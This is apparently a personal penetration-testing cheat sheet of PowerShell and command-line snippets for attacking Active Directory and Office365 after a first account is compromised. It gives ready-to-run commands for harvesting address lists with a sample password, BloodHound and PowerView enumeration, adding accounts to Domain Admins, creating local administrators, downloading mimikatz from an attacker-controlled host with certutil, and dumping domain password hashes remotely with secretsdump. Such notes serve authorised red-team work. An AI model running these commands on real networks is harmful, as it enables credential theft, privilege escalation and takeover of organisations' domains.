---
title: General cheat sheets
layout: page
---

Compilation of personal notes

# Office365/OWA (MailSniper) - http://www.dafthack.com/files/MailSniper-Field-Manual.pdf

## Dump e-mail accounts after first account compromise
```powershell
Import-Module MailSniper.ps1
Get-GlobalAddressList -ExchHostname 'outlook.office365.com' -UserName 'username@domain.com.br' -Password 'Spring2017' -OutFile global-address-list.txt
```

# AD and Powershell

## Powershell mode
```powershell
powershell -Command "$ExecutionContext.SessionState.LanguageMode"
```

## Restore deleted objects from Recycle Bin
```powershell
# 1. Check if the feature is enabled
Get-ADOptionalFeature "Recycle Bin Feature" | select-object name, EnabledScopes
# 2. Retrieve AD Object and restore it
Get-ADObject -Filter 'sAMAccountName -eq "DeletedAdmin"' | Restore-ADObject
```

## Check user ACLs
```powershell
(Get-ACL "AD:$((Get-ADUser myaccount).distinguishedname)").access
```

## Bloodhound ingestor - https://hunter2.gitbook.io/darthsidious/enumeration/bloodhound
```powershell
Invoke-Bloodhound -CollectionMethod All -Compress
```

## Check password policy for lockouts
```bat
net accounts
```

## Get current domain and domain controller
```powershell
[System.DirectoryServices.ActiveDirectory.Domain].GetCurrentDomain()
```

## Search logged on users (From domain joined computer)
```powershell
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client123 # -Server dc01.corp
Get-NetSession -ComputerName dc01
```

## List domain users
```powershell
net user /domain
Get-ADUser
```

## Powershell prompt in domain context (Useful for bloodhound ingestor from outside a domain-joined box or querying stuff in AD)
```bat
runas /netonly /user:domain\user powershell
```

## All Groups that the user belongs to
```powershell
Get-ADPrincipalGroupMembership user | Select name
```
# Adding domain user (Need RSAT module)
```powershell
New-ADUser -Name "Satinha da Silva" -Samusername "sata.silva" -Enabled $True
Add-ADGroupMember -Identity "Domain Admin" -Members "satinha"
```
# Creating local user
```powershell
Password = Read-Host -AsSecureString
New-LocalUser "User03" -Password $Password -FullName "Third User" -Description "Description of this account."
# cmd.exe
net user username password /add
net localgroup Administrators username /add
```
# Download files from windows
```powershell
certutil.exe -urlcache -split -f http://10.10.10.10/mimikatz.exe mimikatz.exe
IWR -Uri http://asdasd.com.br/file.exe -Outfile file.exe # (Invoke-WebRequest)
```
# Remote dump ntds.dit file
```bash
secretsdump.py -just-dc-ntlm domain/user@dc-name.corp 43ad9d72b6fad288056f81166418c3bf
```
# Object properties
```powershell
Get-ADObject -SearchBase "DC=corp,DC=local" -filter 'SamAccountName -eq "admin"' -property *
```
# Enumerate LDAP distingued names
```bash
ldapsearch -x -h dc-01.corp.local -s base namingcontexts
# And then dumping it
ldapsearch -x -h dc-01.corp.local -b 'DC=corp,DC=local'
```